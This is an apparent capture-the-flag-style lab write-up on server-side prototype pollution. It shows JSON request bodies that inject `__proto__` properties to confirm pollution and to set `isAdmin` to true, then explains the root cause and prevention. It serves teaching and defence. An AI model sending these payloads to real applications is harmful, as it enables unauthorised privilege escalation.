# Lab: Server-side prototype pollution via flawed object merging

## Lab Description

This lab is vulnerable to **Server-Side Prototype Pollution (SSPP)** because the application merges user-controlled JSON objects into existing objects without filtering dangerous properties such as `__proto__`.

By polluting the application's prototype, it becomes possible to modify properties used by the server, eventually granting administrator privileges.

---

# Objective

Gain administrator privileges by exploiting server-side prototype pollution.

---

# Recon

After logging in, changing the account address sends the following JSON request:

```http
POST /my-account/change-address HTTP/2
Content-Type: application/json

{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>"
}
```

The response contains:

```json
{
    "username":"wiener",
    "firstname":"Peter",
    "lastname":"Wiener",
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "isAdmin":false
}
```

Notice that the server returns an `isAdmin` field.

---

## Screenshot

![Original Request](json-request-showing-varios-fields(1).png)

---

# Step 1 — Verify Prototype Pollution

Insert a `__proto__` object into the JSON body.

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",

    "__proto__":{
        "foo":"bar"
    }
}
```

The server response now includes:

```json
{
    ...
    "foo":"bar"
}
```

Since `foo` was never part of the application's object, this proves that the prototype has been polluted.

---

## Screenshot

![Prototype Pollution Confirmed](modified-request-to-check-server-side-pollution(1).png)

---

# Step 2 — Escalate Privileges

Replace the test property with:

```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"<session>",

    "__proto__":{
        "isAdmin":true
    }
}
```

---

The response now becomes:

```json
{
    ...
    "isAdmin":true
}
```

The application now considers the current user an administrator.

---

## Screenshot

![Admin Privilege Granted](giving-current-user-admin-privileges-through-prototype-pollution(1).png)

---

# Why it Works

The application merges user-controlled JSON into a server-side object similar to:

```javascript
Object.assign(user, req.body);
```

or

```javascript
merge(user, req.body);
```

Since `__proto__` is not filtered, JavaScript modifies the prototype of the object:

```javascript
Object.prototype.isAdmin = true;
```

Objects that do not have their own `isAdmin` property inherit:

```javascript
obj.isAdmin === true
```

If authorization checks rely on:

```javascript
if (user.isAdmin)
```

instead of checking for an own property, privilege escalation occurs.

---

# Root Cause

The server:

- Accepted arbitrary JSON keys.
- Did not block `__proto__`.
- Used an unsafe merge function.
- Trusted inherited properties during authorization.

---

# Impact

Server-side prototype pollution can lead to:

- Privilege escalation
- Authentication bypass
- Access control bypass
- Business logic manipulation
- Remote Code Execution (depending on the application)

---

# Prevention

- Remove dangerous keys before merging:
  - `__proto__`
  - `prototype`
  - `constructor`
- Use safe object merge libraries.
- Create objects with:

```javascript
Object.create(null)
```

- Always verify own properties:

```javascript
Object.hasOwn(user, "isAdmin")
```

instead of:

```javascript
if (user.isAdmin)
```

---

# Key Takeaways

- `__proto__` modifies an object's prototype.
- Unsafe object merging can pollute server-side objects.
- Prototype pollution affects every object inheriting from the polluted prototype.
- Never trust inherited properties for authorization.
- Always sanitize dangerous property names before merging user input.
